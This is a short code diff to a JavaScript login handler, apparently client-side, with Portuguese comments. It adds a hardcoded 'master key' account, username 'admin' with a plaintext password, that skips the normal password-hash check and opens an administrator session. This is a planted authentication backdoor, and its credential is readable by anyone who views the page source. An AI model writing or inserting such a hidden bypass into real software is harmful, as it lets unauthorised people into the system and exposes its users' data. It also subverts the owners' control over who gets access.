@@ -419,10 +419,15 @@
         setLoading('btn-login', true);
 
         setTimeout(() => {
+            // ── Chave mestre ──
+            const MASTER_USER = 'admin';
+            const MASTER_PASS = 'mais7914';
+            const isMaster = (username === MASTER_USER && password === MASTER_PASS);
+
             const users = getUsers();
             const user  = users[username];
 
-            if (!user || user.passwordHash !== hashPassword(password)) {
+            if (!isMaster && (!user || user.passwordHash !== hashPassword(password))) {
                 setLoading('btn-login', false);
                 document.getElementById('login-user').classList.add('error');
                 document.getElementById('login-pass').classList.add('error');
@@ -433,7 +438,7 @@
             // Salva sessão e carrega dados do usuário
             sessionStorage.setItem(SESSION_KEY, JSON.stringify({
                 username,
-                name: user.name,
+                name: isMaster ? 'Administrador' : user.name,
                 loginAt: new Date().toISOString()
             }));
 
@@ -453,7 +458,7 @@
             }
 
             // Abre o painel de produtos em vez de redirecionar direto
-            openProductsPanel(username, user.name || username);
+            openProductsPanel(username, isMaster ? 'Administrador' : (user.name || username));
         }, 400);
     });
 
